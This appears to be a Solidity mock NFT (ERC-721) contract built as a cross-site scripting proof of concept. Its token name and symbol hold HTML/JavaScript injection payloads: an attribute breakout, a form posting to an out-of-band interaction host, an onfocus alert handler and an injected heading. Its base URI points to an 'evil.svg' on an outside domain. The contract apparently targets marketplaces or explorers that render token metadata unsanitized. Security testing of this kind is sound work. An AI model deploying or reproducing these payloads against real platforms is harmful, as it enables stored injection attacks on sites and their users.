// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

contract Mock721 is ERC721 {
    using Counters for Counters.Counter;

    Counters.Counter private _tokenIdCounter;

    constructor()
        ERC721(
            "\"><form action='https://cjb9wj22vtc0000m9820gjfw6jhyyyyyb.oast.fun/'><input/type='submit' onfocus=\"alert(1)\">Xsomerandomtext",
            '"><h1>randomcontenthere'
        )
    {}

    function _baseURI() internal pure override returns (string memory) {
        return "https://dixitaditya.com/evil.svg";
    }

    function safeMint(address to) public {
        _tokenIdCounter.increment();
        uint256 tokenId = _tokenIdCounter.current();
        _safeMint(to, tokenId);
    }

    function _testsender() public returns (address) {
        return msg.sender;
    }

    function callme() external returns (address) {
        address msgtest = _testsender();
        return msgtest;
    }
}
